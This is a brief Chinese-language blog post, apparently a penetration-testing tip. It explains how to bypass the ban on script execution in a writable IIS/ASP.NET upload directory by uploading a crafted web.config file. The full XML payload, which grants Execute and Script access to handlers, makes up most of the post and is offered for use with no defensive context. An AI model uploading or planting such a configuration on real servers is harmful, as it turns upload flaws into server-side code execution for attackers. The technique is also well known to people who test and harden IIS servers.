---
title: "Web.config 突破权限限制"
date: 2018-07-19T00:00:00+08:00
draft: false
tags: ['asp.net']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

在一个可读写的目录里无法执行脚本, 通过上传特殊的 `web.config` 文件突破限制.

<!--more-->

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Write, Execute, Script" />
    </system.webServer>
</configuration>
```